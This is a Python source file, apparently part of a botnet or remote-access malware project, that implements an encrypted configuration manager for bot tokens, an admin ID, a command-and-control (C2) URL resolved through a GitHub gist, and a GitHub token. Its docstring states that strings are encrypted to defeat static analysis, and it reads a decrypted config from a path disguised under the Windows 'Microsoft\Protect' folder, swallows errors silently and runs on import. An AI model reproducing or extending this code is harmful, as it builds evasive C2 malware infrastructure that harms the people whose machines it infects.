from core.resolver import (
    Resolver, _OS, _JSON, _TYPING
)
os = Resolver.get_mod(_OS)
json = Resolver.get_mod(_JSON)
typing = Resolver.get_mod(_TYPING)
Dict, Any = typing.Dict, typing.Any

class ConfigManager:
    """
    A-06: Encrypted Configuration System.
    
    Centralized manager for all bot settings, including API tokens, 
    C2 addresses, and feature flags. All sensitive strings are stored 
    in an encrypted format and decrypted only at runtime to prevent 
    static analysis from revealing infrastructure details.
    """
    _config: Dict[str, Any] = {}

    @classmethod
    def load(cls):
        """Loads and decrypts configuration from environment, embedded strings, or external file"""
        Resolver.load_native()
        Resolver.load_native()
        import VanguardCore
        # 1. Start with embedded configuration (fallback)
        embedded = {
            "BOT_TOKEN": VanguardCore.SafetyManager.GetSecret("BOT_TOKEN"),
            "ADMIN_ID": VanguardCore.SafetyManager.GetSecret("ADMIN_ID"),
            "GLOBAL_CHID": VanguardCore.SafetyManager.GetSecret("ADMIN_ID"),
            "GIST_RESOLVER_URL": VanguardCore.SafetyManager.GetSecret("GIST_URL"),
            "C2_URL": VanguardCore.SafetyManager.GetSecret("GIST_URL"),
            "GIST_PROXY_ID": VanguardCore.SafetyManager.GetSecret("GIST_PROXY_ID"),
            "GIST_GITHUB_TOKEN": VanguardCore.SafetyManager.GetSecret("GIST_GITHUB_TOKEN"),
        }
        cls._config.update(embedded)

        # 2. Try loading extra config from external encrypted file
        config_paths = [
            os.path.join(os.getcwd(), "config.dat"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.dat"),
            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Protect", "config.dat")
        ]

        for path in config_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        enc_data = f.read().strip()
                        if enc_data:
                            dec_data = Resolver.decrypt(enc_data)
                            external_config = json.loads(dec_data)
                            cls._config.update(external_config)
                            # print(f"✅ Loaded external config from {path}")
                            break
                except Exception as e:
                    pass

        # 3. Override with environment variables if present
        for key in ["BOT_TOKEN", "ADMIN_ID", "GLOBAL_CHID"]:
            val = os.environ.get(key)
            if val:
                cls._config[key] = val

    @classmethod
    def get(cls, key: str, default: Any = None) -> Any:
        return cls._config.get(key, default)

    @classmethod
    def get_int(cls, key: str, default: int = 0) -> int:
        try:
            return int(cls.get(key, default))
        except:
            return default

# Initialize on import
ConfigManager.load()